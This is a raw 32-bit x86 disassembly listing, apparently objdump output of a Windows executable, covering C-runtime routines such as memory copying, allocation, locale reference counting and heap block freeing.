  4247c0:	mov    eax,edi
  4247c2:	mov    edx,0x3
  4247c7:	cmp    ecx,0x4
  4247ca:	jb     0x4247d8
  4247cc:	and    eax,0x3
  4247cf:	sub    ecx,eax
  4247d1:	jmp    DWORD PTR [eax*4+0x4247dc]
  4247d8:	jmp    DWORD PTR [ecx*4+0x4248d8]
  4247df:	nop
  4247e0:	in     al,dx
  4247e1:	inc    edi
  4247e2:	inc    edx
  4247e3:	add    BYTE PTR [eax],dl
  4247e5:	dec    eax
  4247e6:	inc    edx
  4247e7:	add    BYTE PTR [eax],bh
  4247e9:	dec    eax
  4247ea:	inc    edx
  4247eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247f1:	mov    BYTE PTR [edi+0x3],al
  4247f4:	sub    esi,0x1
  4247f7:	shr    ecx,0x2
  4247fa:	sub    edi,0x1
  4247fd:	cmp    ecx,0x8
  424800:	jb     0x4247b4
  424802:	std    
  424803:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424805:	cld    
  424806:	jmp    DWORD PTR [edx*4+0x4248d8]
  42480d:	lea    ecx,[ecx+0x0]
  424810:	mov    al,BYTE PTR [esi+0x3]
  424813:	and    edx,ecx
  424815:	mov    BYTE PTR [edi+0x3],al
  424818:	mov    al,BYTE PTR [esi+0x2]
  42481b:	shr    ecx,0x2
  42481e:	mov    BYTE PTR [edi+0x2],al
  424821:	sub    esi,0x2
  424824:	sub    edi,0x2
  424827:	cmp    ecx,0x8
  42482a:	jb     0x4247b4
  42482c:	std    
  42482d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42482f:	cld    
  424830:	jmp    DWORD PTR [edx*4+0x4248d8]
  424837:	nop
  424838:	mov    al,BYTE PTR [esi+0x3]
  42483b:	and    edx,ecx
  42483d:	mov    BYTE PTR [edi+0x3],al
  424840:	mov    al,BYTE PTR [esi+0x2]
  424843:	mov    BYTE PTR [edi+0x2],al
  424846:	mov    al,BYTE PTR [esi+0x1]
  424849:	shr    ecx,0x2
  42484c:	mov    BYTE PTR [edi+0x1],al
  42484f:	sub    esi,0x3
  424852:	sub    edi,0x3
  424855:	cmp    ecx,0x8
  424858:	jb     0x4247b4
  42485e:	std    
  42485f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424861:	cld    
  424862:	jmp    DWORD PTR [edx*4+0x4248d8]
  424869:	lea    ecx,[ecx+0x0]
  42486c:	mov    WORD PTR [eax+0x42],cs
  42486f:	add    BYTE PTR [eax+ecx*2+0x489c0042],dl
  424876:	inc    edx
  424877:	add    BYTE PTR [eax+ecx*2+0x48ac0042],ah
  42487e:	inc    edx
  42487f:	add    BYTE PTR [eax+ecx*2+0x48bc0042],dh
  424886:	inc    edx
  424887:	add    bh,cl
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424891:	inc    esp
  424892:	(bad)  
  424893:	sbb    al,0x8b
  424895:	inc    esp
  424896:	mov    ds,WORD PTR [eax]
  424898:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42489c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  4248a0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  4248a4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  4248a8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  4248ac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  4248b0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  4248b4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  4248b8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  4248bc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4248c0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4248c4:	lea    eax,[ecx*4+0x0]
  4248cb:	add    esi,eax
  4248cd:	add    edi,eax
  4248cf:	jmp    DWORD PTR [edx*4+0x4248d8]
  4248d6:	mov    edi,edi
  4248d8:	call   0xf0428b25
  4248dd:	dec    eax
  4248de:	inc    edx
  4248df:	add    BYTE PTR [eax],al
  4248e1:	dec    ecx
  4248e2:	inc    edx
  4248e3:	add    BYTE PTR [ecx+ecx*2],dl
  4248e6:	inc    edx
  4248e7:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4248ed:	leave  
  4248ee:	ret    
  4248ef:	nop
  4248f0:	mov    al,BYTE PTR [esi+0x3]
  4248f3:	mov    BYTE PTR [edi+0x3],al
  4248f6:	mov    eax,DWORD PTR [ebp+0x8]
  4248f9:	pop    esi
  4248fa:	pop    edi
  4248fb:	leave  
  4248fc:	ret    
  4248fd:	lea    ecx,[ecx+0x0]
  424900:	mov    al,BYTE PTR [esi+0x3]
  424903:	mov    BYTE PTR [edi+0x3],al
  424906:	mov    al,BYTE PTR [esi+0x2]
  424909:	mov    BYTE PTR [edi+0x2],al
  42490c:	mov    eax,DWORD PTR [ebp+0x8]
  42490f:	pop    esi
  424910:	pop    edi
  424911:	leave  
  424912:	ret    
  424913:	nop
  424914:	mov    al,BYTE PTR [esi+0x3]
  424917:	mov    BYTE PTR [edi+0x3],al
  42491a:	mov    al,BYTE PTR [esi+0x2]
  42491d:	mov    BYTE PTR [edi+0x2],al
  424920:	mov    al,BYTE PTR [esi+0x1]
  424923:	mov    BYTE PTR [edi+0x1],al
  424926:	mov    eax,DWORD PTR [ebp+0x8]
  424929:	pop    esi
  42492a:	pop    edi
  42492b:	leave  
  42492c:	ret    
  42492d:	push   DWORD PTR [esp+0x4]
  424931:	call   DWORD PTR ds:0x4280ac
  424937:	xor    eax,eax
  424939:	inc    eax
  42493a:	ret    0x8
  42493d:	push   0x10
  42493f:	push   0x4285c0
  424944:	call   0x4238a8
  424949:	mov    eax,ds:0x45cd88
  42494e:	test   eax,eax
  424950:	jne    0x424989
  424952:	cmp    DWORD PTR ds:0x45cac4,0x1
  424959:	je     0x42497f
  42495b:	push   0x4285ac
  424960:	call   DWORD PTR ds:0x428018
  424966:	test   eax,eax
  424968:	je     0x42497f
  42496a:	push   0x428584
  42496f:	push   eax
  424970:	call   DWORD PTR ds:0x42801c
  424976:	mov    ds:0x45cd88,eax
  42497b:	test   eax,eax
  42497d:	jne    0x424989
  42497f:	mov    eax,0x42492d
  424984:	mov    ds:0x45cd88,eax
  424989:	and    DWORD PTR [ebp-0x4],0x0
  42498d:	push   DWORD PTR [ebp+0xc]
  424990:	push   DWORD PTR [ebp+0x8]
  424993:	call   eax
  424995:	mov    DWORD PTR [ebp-0x1c],eax
  424998:	jmp    0x4249be
  42499a:	mov    eax,DWORD PTR [ebp-0x14]
  42499d:	mov    eax,DWORD PTR [eax]
  42499f:	mov    eax,DWORD PTR [eax]
  4249a1:	mov    DWORD PTR [ebp-0x20],eax
  4249a4:	xor    eax,eax
  4249a6:	inc    eax
  4249a7:	ret    
  4249a8:	mov    esp,DWORD PTR [ebp-0x18]
  4249ab:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  4249b2:	jne    0x4249bc
  4249b4:	push   0x8
  4249b6:	call   DWORD PTR ds:0x42806c
  4249bc:	xor    eax,eax
  4249be:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249c2:	call   0x4238e3
  4249c7:	ret    
  4249c8:	push   0x10
  4249ca:	push   0x4285d0
  4249cf:	call   0x4238a8
  4249d4:	mov    esi,DWORD PTR [ebp+0x8]
  4249d7:	imul   esi,DWORD PTR [ebp+0xc]
  4249db:	mov    DWORD PTR [ebp-0x1c],esi
  4249de:	test   esi,esi
  4249e0:	jne    0x4249e3
  4249e2:	inc    esi
  4249e3:	xor    edi,edi
  4249e5:	mov    DWORD PTR [ebp-0x20],edi
  4249e8:	cmp    esi,0xffffffe0
  4249eb:	ja     0x424a52
  4249ed:	cmp    DWORD PTR ds:0x45d144,0x3
  4249f4:	jne    0x424a3d
  4249f6:	add    esi,0xf
  4249f9:	and    esi,0xfffffff0
  4249fc:	mov    DWORD PTR [ebp+0xc],esi
  4249ff:	mov    ebx,DWORD PTR [ebp-0x1c]
  424a02:	cmp    ebx,DWORD PTR ds:0x45cf04
  424a08:	ja     0x424a3d
  424a0a:	push   0x4
  424a0c:	call   0x423a6f
  424a11:	pop    ecx
  424a12:	and    DWORD PTR [ebp-0x4],edi
  424a15:	push   ebx
  424a16:	call   0x425471
  424a1b:	pop    ecx
  424a1c:	mov    DWORD PTR [ebp-0x20],eax
  424a1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a23:	call   0x424a72
  424a28:	mov    edi,DWORD PTR [ebp-0x20]
  424a2b:	test   edi,edi
  424a2d:	je     0x424a41
  424a2f:	push   DWORD PTR [ebp-0x1c]
  424a32:	push   0x0
  424a34:	push   edi
  424a35:	call   0x4261b0
  424a3a:	add    esp,0xc
  424a3d:	test   edi,edi
  424a3f:	jne    0x424a7b
  424a41:	push   esi
  424a42:	push   0x8
  424a44:	push   DWORD PTR ds:0x45d140
  424a4a:	call   DWORD PTR ds:0x4280a8
  424a50:	mov    edi,eax
  424a52:	test   edi,edi
  424a54:	jne    0x424a7b
  424a56:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a5c:	je     0x424a7b
  424a5e:	push   esi
  424a5f:	call   0x426192
  424a64:	pop    ecx
  424a65:	test   eax,eax
  424a67:	jne    0x4249e3
  424a6d:	jmp    0x424a7d
  424a6f:	mov    esi,DWORD PTR [ebp+0xc]
  424a72:	push   0x4
  424a74:	call   0x4239db
  424a79:	pop    ecx
  424a7a:	ret    
  424a7b:	mov    eax,edi
  424a7d:	call   0x4238e3
  424a82:	ret    
  424a83:	push   esi
  424a84:	mov    esi,DWORD PTR [esp+0x8]
  424a88:	mov    eax,DWORD PTR [esi+0x3c]
  424a8b:	push   edi
  424a8c:	xor    edi,edi
  424a8e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a94:	je     0x424af9
  424a96:	cmp    eax,edi
  424a98:	je     0x424af9
  424a9a:	mov    eax,DWORD PTR [esi+0x2c]
  424a9d:	cmp    DWORD PTR [eax],edi
  424a9f:	jne    0x424af9
  424aa1:	mov    eax,DWORD PTR [esi+0x34]
  424aa4:	cmp    eax,edi
  424aa6:	je     0x424ac4
  424aa8:	cmp    DWORD PTR [eax],edi
  424aaa:	jne    0x424ac4
  424aac:	cmp    eax,DWORD PTR ds:0x45cef0
  424ab2:	je     0x424ac4
  424ab4:	push   eax
  424ab5:	call   0x4244ba
  424aba:	push   DWORD PTR [esi+0x3c]
  424abd:	call   0x4263ff
  424ac2:	pop    ecx
  424ac3:	pop    ecx
  424ac4:	mov    eax,DWORD PTR [esi+0x30]
  424ac7:	cmp    eax,edi
  424ac9:	je     0x424ae7
  424acb:	cmp    DWORD PTR [eax],edi
  424acd:	jne    0x424ae7
  424acf:	cmp    eax,DWORD PTR ds:0x45cef4
  424ad5:	je     0x424ae7
  424ad7:	push   eax
  424ad8:	call   0x4244ba
  424add:	push   DWORD PTR [esi+0x3c]
  424ae0:	call   0x4263a0
  424ae5:	pop    ecx
  424ae6:	pop    ecx
  424ae7:	push   DWORD PTR [esi+0x2c]
  424aea:	call   0x4244ba
  424aef:	push   DWORD PTR [esi+0x3c]
  424af2:	call   0x4244ba
  424af7:	pop    ecx
  424af8:	pop    ecx
  424af9:	mov    eax,DWORD PTR [esi+0x40]
  424afc:	cmp    eax,DWORD PTR ds:0x45ceec
  424b02:	je     0x424b1c
  424b04:	cmp    eax,edi
  424b06:	je     0x424b1c
  424b08:	cmp    DWORD PTR [eax],edi
  424b0a:	jne    0x424b1c
  424b0c:	push   eax
  424b0d:	call   0x4244ba
  424b12:	push   DWORD PTR [esi+0x44]
  424b15:	call   0x4244ba
  424b1a:	pop    ecx
  424b1b:	pop    ecx
  424b1c:	mov    eax,DWORD PTR [esi+0x50]
  424b1f:	cmp    eax,DWORD PTR ds:0x45cdd0
  424b25:	je     0x424b43
  424b27:	cmp    eax,edi
  424b29:	je     0x424b43
  424b2b:	cmp    DWORD PTR [eax+0xb4],edi
  424b31:	jne    0x424b43
  424b33:	push   eax
  424b34:	call   0x426210
  424b39:	push   DWORD PTR [esi+0x50]
  424b3c:	call   0x4244ba
  424b41:	pop    ecx
  424b42:	pop    ecx
  424b43:	push   esi
  424b44:	call   0x4244ba
  424b49:	pop    ecx
  424b4a:	pop    edi
  424b4b:	pop    esi
  424b4c:	ret    
  424b4d:	push   esi
  424b4e:	call   0x42375d
  424b53:	mov    esi,eax
  424b55:	mov    eax,DWORD PTR [esi+0x64]
  424b58:	cmp    eax,DWORD PTR ds:0x45c58c
  424b5e:	je     0x424c0a
  424b64:	test   eax,eax
  424b66:	je     0x424b97
  424b68:	mov    ecx,DWORD PTR [eax+0x2c]
  424b6b:	dec    DWORD PTR [eax]
  424b6d:	test   ecx,ecx
  424b6f:	je     0x424b73
  424b71:	dec    DWORD PTR [ecx]
  424b73:	mov    ecx,DWORD PTR [eax+0x34]
  424b76:	test   ecx,ecx
  424b78:	je     0x424b7c
  424b7a:	dec    DWORD PTR [ecx]
  424b7c:	mov    ecx,DWORD PTR [eax+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	dec    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR [eax+0x40]
  424b88:	test   ecx,ecx
  424b8a:	je     0x424b8e
  424b8c:	dec    DWORD PTR [ecx]
  424b8e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b91:	dec    DWORD PTR [ecx+0xb4]
  424b97:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9d:	mov    DWORD PTR [esi+0x64],ecx
  424ba0:	mov    ecx,DWORD PTR ds:0x45c58c
  424ba6:	inc    DWORD PTR [ecx]
  424ba8:	mov    ecx,DWORD PTR ds:0x45c58c
  424bae:	mov    ecx,DWORD PTR [ecx+0x2c]
  424bb1:	test   ecx,ecx
  424bb3:	je     0x424bb7
  424bb5:	inc    DWORD PTR [ecx]
  424bb7:	mov    ecx,DWORD PTR ds:0x45c58c
  424bbd:	mov    ecx,DWORD PTR [ecx+0x34]
  424bc0:	test   ecx,ecx
  424bc2:	je     0x424bc6
  424bc4:	inc    DWORD PTR [ecx]
  424bc6:	mov    ecx,DWORD PTR ds:0x45c58c
  424bcc:	mov    ecx,DWORD PTR [ecx+0x30]
  424bcf:	test   ecx,ecx
  424bd1:	je     0x424bd5
  424bd3:	inc    DWORD PTR [ecx]
  424bd5:	mov    ecx,DWORD PTR ds:0x45c58c
  424bdb:	mov    ecx,DWORD PTR [ecx+0x40]
  424bde:	test   ecx,ecx
  424be0:	je     0x424be4
  424be2:	inc    DWORD PTR [ecx]
  424be4:	mov    ecx,DWORD PTR ds:0x45c58c
  424bea:	mov    ecx,DWORD PTR [ecx+0x4c]
  424bed:	inc    DWORD PTR [ecx+0xb4]
  424bf3:	test   eax,eax
  424bf5:	je     0x424c0a
  424bf7:	cmp    DWORD PTR [eax],0x0
  424bfa:	jne    0x424c0a
  424bfc:	cmp    eax,0x45c538
  424c01:	je     0x424c0a
  424c03:	push   eax
  424c04:	call   0x424a83
  424c09:	pop    ecx
  424c0a:	mov    eax,DWORD PTR [esi+0x64]
  424c0d:	pop    esi
  424c0e:	ret    
  424c0f:	push   0xc
  424c11:	push   0x428760
  424c16:	call   0x4238a8
  424c1b:	push   0xc
  424c1d:	call   0x423a6f
  424c22:	pop    ecx
  424c23:	and    DWORD PTR [ebp-0x4],0x0
  424c27:	call   0x424b4d
  424c2c:	mov    DWORD PTR [ebp-0x1c],eax
  424c2f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424c33:	call   0x424c41
  424c38:	mov    eax,DWORD PTR [ebp-0x1c]
  424c3b:	call   0x4238e3
  424c40:	ret    
  424c41:	push   0xc
  424c43:	call   0x4239db
  424c48:	pop    ecx
  424c49:	ret    
  424c4a:	push   0x140
  424c4f:	push   0x0
  424c51:	push   DWORD PTR ds:0x45d140
  424c57:	call   DWORD PTR ds:0x4280a8
  424c5d:	test   eax,eax
  424c5f:	mov    ds:0x45cf00,eax
  424c64:	jne    0x424c67
  424c66:	ret    
  424c67:	mov    ecx,DWORD PTR [esp+0x4]
  424c6b:	and    DWORD PTR ds:0x45cef8,0x0
  424c72:	and    DWORD PTR ds:0x45cefc,0x0
  424c79:	mov    ds:0x45cf08,eax
  424c7e:	xor    eax,eax
  424c80:	mov    DWORD PTR ds:0x45cf04,ecx
  424c86:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c90:	inc    eax
  424c91:	ret    
  424c92:	mov    eax,ds:0x45cefc
  424c97:	lea    ecx,[eax+eax*4]
  424c9a:	mov    eax,ds:0x45cf00
  424c9f:	lea    ecx,[eax+ecx*4]
  424ca2:	jmp    0x424cb6
  424ca4:	mov    edx,DWORD PTR [esp+0x4]
  424ca8:	sub    edx,DWORD PTR [eax+0xc]
  424cab:	cmp    edx,0x100000
  424cb1:	jb     0x424cbc
  424cb3:	add    eax,0x14
  424cb6:	cmp    eax,ecx
  424cb8:	jb     0x424ca4
  424cba:	xor    eax,eax
  424cbc:	ret    
  424cbd:	push   ebp
  424cbe:	mov    ebp,esp
  424cc0:	sub    esp,0x10
  424cc3:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc6:	mov    eax,DWORD PTR [ecx+0x10]
  424cc9:	push   esi
  424cca:	mov    esi,DWORD PTR [ebp+0xc]
  424ccd:	push   edi
  424cce:	mov    edi,esi
  424cd0:	sub    edi,DWORD PTR [ecx+0xc]
  424cd3:	add    esi,0xfffffffc
  424cd6:	shr    edi,0xf
  424cd9:	mov    ecx,edi
  424cdb:	imul   ecx,ecx,0x204
  424ce1:	lea    ecx,[ecx+eax*1+0x144]
  424ce8:	mov    DWORD PTR [ebp-0x10],ecx
  424ceb:	mov    ecx,DWORD PTR [esi]
  424ced:	dec    ecx
  424cee:	test   cl,0x1
  424cf1:	mov    DWORD PTR [ebp-0x4],ecx
  424cf4:	jne    0x424fd1
  424cfa:	push   ebx
  424cfb:	lea    ebx,[ecx+esi*1]
  424cfe:	mov    edx,DWORD PTR [ebx]
  424d00:	mov    DWORD PTR [ebp-0xc],edx
  424d03:	mov    edx,DWORD PTR [esi-0x4]
  424d06:	mov    DWORD PTR [ebp-0x8],edx
  424d09:	mov    edx,DWORD PTR [ebp-0xc]
  424d0c:	test   dl,0x1
  424d0f:	mov    DWORD PTR [ebp+0xc],ebx
  424d12:	jne    0x424d88
  424d14:	sar    edx,0x4
  424d17:	dec    edx
  424d18:	cmp    edx,0x3f
  424d1b:	jbe    0x424d20
  424d1d:	push   0x3f
  424d1f:	pop    edx
  424d20:	mov    ecx,DWORD PTR [ebx+0x4]
  424d23:	cmp    ecx,DWORD PTR [ebx+0x8]
  424d26:	jne    0x424d6a
  424d28:	cmp    edx,0x20
  424d2b:	mov    ebx,0x80000000
  424d30:	jae    0x424d4b
  424d32:	mov    ecx,edx
  424d34:	shr    ebx,cl
  424d36:	lea    ecx,[edx+eax*1+0x4]
  424d3a:	not    ebx
  424d3c:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424d40:	dec    BYTE PTR [ecx]
  424d42:	jne    0x424d67
  424d44:	mov    ecx,DWORD PTR [ebp+0x8]
  424d47:	and    DWORD PTR [ecx],ebx
  424d49:	jmp    0x424d67
  424d4b:	lea    ecx,[edx-0x20]
  424d4e:	shr    ebx,cl
  424d50:	lea    ecx,[edx+eax*1+0x4]
  424d54:	not    ebx
  424d56:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d5d:	dec    BYTE PTR [ecx]
  424d5f:	jne    0x424d67
  424d61:	mov    ecx,DWORD PTR [ebp+0x8]
  424d64:	and    DWORD PTR [ecx+0x4],ebx
  424d67:	mov    ebx,DWORD PTR [ebp+0xc]
  424d6a:	mov    edx,DWORD PTR [ebx+0x8]
  424d6d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d70:	mov    ecx,DWORD PTR [ebp-0x4]
  424d73:	add    ecx,DWORD PTR [ebp-0xc]
  424d76:	mov    DWORD PTR [edx+0x4],ebx
  424d79:	mov    edx,DWORD PTR [ebp+0xc]
  424d7c:	mov    ebx,DWORD PTR [edx+0x4]
  424d7f:	mov    edx,DWORD PTR [edx+0x8]
  424d82:	mov    DWORD PTR [ebx+0x8],edx
  424d85:	mov    DWORD PTR [ebp-0x4],ecx
  424d88:	mov    edx,ecx
  424d8a:	sar    edx,0x4
  424d8d:	dec    edx
  424d8e:	cmp    edx,0x3f
  424d91:	jbe    0x424d96
  424d93:	push   0x3f
  424d95:	pop    edx
  424d96:	mov    ebx,DWORD PTR [ebp-0x8]
  424d99:	and    ebx,0x1
  424d9c:	mov    DWORD PTR [ebp-0xc],ebx
  424d9f:	jne    0x424e34
  424da5:	sub    esi,DWORD PTR [ebp-0x8]
  424da8:	mov    ebx,DWORD PTR [ebp-0x8]
  424dab:	sar    ebx,0x4
  424dae:	push   0x3f
  424db0:	mov    DWORD PTR [ebp+0xc],esi
  424db3:	dec    ebx
  424db4:	pop    esi
  424db5:	cmp    ebx,esi
  424db7:	jbe    0x424dbb
  424db9:	mov    ebx,esi
  424dbb:	add    ecx,DWORD PTR [ebp-0x8]
  424dbe:	mov    edx,ecx
  424dc0:	sar    edx,0x4
  424dc3:	dec    edx
  424dc4:	cmp    edx,esi
  424dc6:	mov    DWORD PTR [ebp-0x4],ecx
  424dc9:	jbe    0x424dcd
  424dcb:	mov    edx,esi
  424dcd:	cmp    ebx,edx
  424dcf:	je     0x424e2f
  424dd1:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd4:	mov    esi,DWORD PTR [ecx+0x4]
  424dd7:	cmp    esi,DWORD PTR [ecx+0x8]
  424dda:	jne    0x424e17
  424ddc:	cmp    ebx,0x20
  424ddf:	mov    esi,0x80000000
  424de4:	jae    0x424dfd
  424de6:	mov    ecx,ebx
  424de8:	shr    esi,cl
  424dea:	not    esi
  424dec:	and    DWORD PTR [eax+edi*4+0x44],esi
  424df0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424df4:	jne    0x424e17
  424df6:	mov    ecx,DWORD PTR [ebp+0x8]
  424df9:	and    DWORD PTR [ecx],esi
  424dfb:	jmp    0x424e17
  424dfd:	lea    ecx,[ebx-0x20]
  424e00:	shr    esi,cl
  424e02:	not    esi
  424e04:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424e0b:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e0f:	jne    0x424e17
  424e11:	mov    ecx,DWORD PTR [ebp+0x8]
  424e14:	and    DWORD PTR [ecx+0x4],esi
  424e17:	mov    ecx,DWORD PTR [ebp+0xc]
  424e1a:	mov    esi,DWORD PTR [ecx+0x8]
  424e1d:	mov    ecx,DWORD PTR [ecx+0x4]
  424e20:	mov    DWORD PTR [esi+0x4],ecx
  424e23:	mov    ecx,DWORD PTR [ebp+0xc]
  424e26:	mov    esi,DWORD PTR [ecx+0x4]
  424e29:	mov    ecx,DWORD PTR [ecx+0x8]
  424e2c:	mov    DWORD PTR [esi+0x8],ecx
  424e2f:	mov    esi,DWORD PTR [ebp+0xc]
  424e32:	jmp    0x424e37
  424e34:	mov    ebx,DWORD PTR [ebp+0x8]
  424e37:	cmp    DWORD PTR [ebp-0xc],0x0
  424e3b:	jne    0x424e45
  424e3d:	cmp    ebx,edx
  424e3f:	je     0x424ec5
  424e45:	mov    ecx,DWORD PTR [ebp-0x10]
  424e48:	lea    ecx,[ecx+edx*8]
  424e4b:	mov    ebx,DWORD PTR [ecx+0x4]
  424e4e:	mov    DWORD PTR [esi+0x8],ecx
  424e51:	mov    DWORD PTR [esi+0x4],ebx
  424e54:	mov    DWORD PTR [ecx+0x4],esi
  424e57:	mov    ecx,DWORD PTR [esi+0x4]
  424e5a:	mov    DWORD PTR [ecx+0x8],esi
  424e5d:	mov    ecx,DWORD PTR [esi+0x4]
  424e60:	cmp    ecx,DWORD PTR [esi+0x8]
  424e63:	jne    0x424ec5
  424e65:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e69:	mov    BYTE PTR [ebp+0xf],cl
  424e6c:	inc    cl
  424e6e:	cmp    edx,0x20
  424e71:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e75:	jae    0x424e9c
  424e77:	cmp    BYTE PTR [ebp+0xf],0x0
  424e7b:	jne    0x424e8b
  424e7d:	mov    ecx,edx
  424e7f:	mov    ebx,0x80000000
  424e84:	shr    ebx,cl
  424e86:	mov    ecx,DWORD PTR [ebp+0x8]
  424e89:	or     DWORD PTR [ecx],ebx
  424e8b:	mov    ebx,0x80000000
  424e90:	mov    ecx,edx
  424e92:	shr    ebx,cl
  424e94:	lea    eax,[eax+edi*4+0x44]
  424e98:	or     DWORD PTR [eax],ebx
  424e9a:	jmp    0x424ec5
  424e9c:	cmp    BYTE PTR [ebp+0xf],0x0
  424ea0:	jne    0x424eb2
  424ea2:	lea    ecx,[edx-0x20]
  424ea5:	mov    ebx,0x80000000
  424eaa:	shr    ebx,cl
  424eac:	mov    ecx,DWORD PTR [ebp+0x8]
  424eaf:	or     DWORD PTR [ecx+0x4],ebx
  424eb2:	lea    ecx,[edx-0x20]
  424eb5:	mov    edx,0x80000000
  424eba:	shr    edx,cl
  424ebc:	lea    eax,[eax+edi*4+0xc4]
  424ec3:	or     DWORD PTR [eax],edx
  424ec5:	mov    eax,DWORD PTR [ebp-0x4]
  424ec8:	mov    DWORD PTR [esi],eax
  424eca:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424ece:	mov    eax,DWORD PTR [ebp-0x10]
  424ed1:	dec    DWORD PTR [eax]
  424ed3:	jne    0x424fd0
  424ed9:	mov    eax,ds:0x45cef8
  424ede:	test   eax,eax
  424ee0:	je     0x424fc2
  424ee6:	mov    ecx,DWORD PTR ds:0x45cf10
  424eec:	mov    esi,DWORD PTR ds:0x428088
  424ef2:	push   0x4000
  424ef7:	shl    ecx,0xf
  424efa:	add    ecx,DWORD PTR [eax+0xc]
  424efd:	mov    ebx,0x8000
  424f02:	push   ebx
  424f03:	push   ecx
  424f04:	call   esi
  424f06:	mov    ecx,DWORD PTR ds:0x45cf10
  424f0c:	mov    eax,ds:0x45cef8
  424f11:	mov    edx,0x80000000
  424f16:	shr    edx,cl
  424f18:	or     DWORD PTR [eax+0x8],edx
  424f1b:	mov    eax,ds:0x45cef8
  424f20:	mov    eax,DWORD PTR [eax+0x10]
  424f23:	mov    ecx,DWORD PTR ds:0x45cf10
  424f29:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424f31:	mov    eax,ds:0x45cef8
  424f36:	mov    eax,DWORD PTR [eax+0x10]
  424f39:	dec    BYTE PTR [eax+0x43]
  424f3c:	mov    eax,ds:0x45cef8
  424f41:	mov    ecx,DWORD PTR [eax+0x10]
  424f44:	cmp    BYTE PTR [ecx+0x43],0x0
  424f48:	jne    0x424f53
  424f4a:	and    DWORD PTR [eax+0x4],0xfffffffe
  424f4e:	mov    eax,ds:0x45cef8
  424f53:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f57:	jne    0x424fc2
  424f59:	push   ebx
  424f5a:	push   0x0
  424f5c:	push   DWORD PTR [eax+0xc]
  424f5f:	call   esi
  424f61:	mov    eax,ds:0x45cef8
  424f66:	push   DWORD PTR [eax+0x10]
  424f69:	push   0x0
  424f6b:	push   DWORD PTR ds:0x45d140
  424f71:	call   DWORD PTR ds:0x42808c
  424f77:	mov    eax,ds:0x45cefc
  424f7c:	mov    edx,DWORD PTR ds:0x45cf00
  424f82:	lea    eax,[eax+eax*4]
  424f85:	shl    eax,0x2
  424f88:	mov    ecx,eax
  424f8a:	mov    eax,ds:0x45cef8
  424f8f:	sub    ecx,eax
  424f91:	lea    ecx,[ecx+edx*1-0x14]
  424f95:	push   ecx
  424f96:	lea    ecx,[eax+0x14]
  424f99:	push   ecx
  424f9a:	push   eax
  424f9b:	call   0x4267f0
  424fa0:	mov    eax,DWORD PTR [ebp+0x8]
  424fa3:	add    esp,0xc
  424fa6:	dec    DWORD PTR ds:0x45cefc
  424fac:	cmp    eax,DWORD PTR ds:0x45cef8
  424fb2:	jbe    0x424fb8
  424fb4:	sub    DWORD PTR [ebp+0x8],0x14
  424fb8:	mov    eax,ds:0x45cf00
  424fbd:	mov    ds:0x45cf08,eax
  424fc2:	mov    eax,DWORD PTR [ebp+0x8]
  424fc5:	mov    ds:0x45cef8,eax
  424fca:	mov    DWORD PTR ds:0x45cf10,edi
  424fd0:	pop    ebx
  424fd1:	pop    edi
  424fd2:	pop    esi
  424fd3:	leave  
  424fd4:	ret    
  424fd5:	mov    eax,ds:0x45cefc
  424fda:	mov    ecx,DWORD PTR ds:0x45cf0c
  424fe0:	push   edi
  424fe1:	xor    edi,edi
  424fe3:	cmp    eax,ecx
  424fe5:	jne    0x42501b
  424fe7:	lea    eax,[ecx+ecx*4+0x50]
  424feb:	shl    eax,0x2
  424fee:	push   eax
  424fef:	push   DWORD PTR ds:0x45cf00
  424ff5:	push   edi
  424ff6:	push   DWORD PTR ds:0x45d140
  424ffc:	call   DWORD PTR ds:0x4280b4
  425002:	cmp    eax,edi
  425004:	jne    0x42500a
  425006:	xor    eax,eax
  425008:	pop    edi
  425009:	ret    
  42500a:	add    DWORD PTR ds:0x45cf0c,0x10
  425011:	mov    ds:0x45cf00,eax
  425016:	mov    eax,ds:0x45cefc
  42501b:	mov    ecx,DWORD PTR ds:0x45cf00
  425021:	push   esi
  425022:	push   0x41c4
  425027:	push   0x8
  425029:	push   DWORD PTR ds:0x45d140
  42502f:	lea    eax,[eax+eax*4]
  425032:	lea    esi,[ecx+eax*4]
  425035:	call   DWORD PTR ds:0x4280a8
  42503b:	cmp    eax,edi
  42503d:	mov    DWORD PTR [esi+0x10],eax
  425040:	jne    0x425046
  425042:	xor    eax,eax
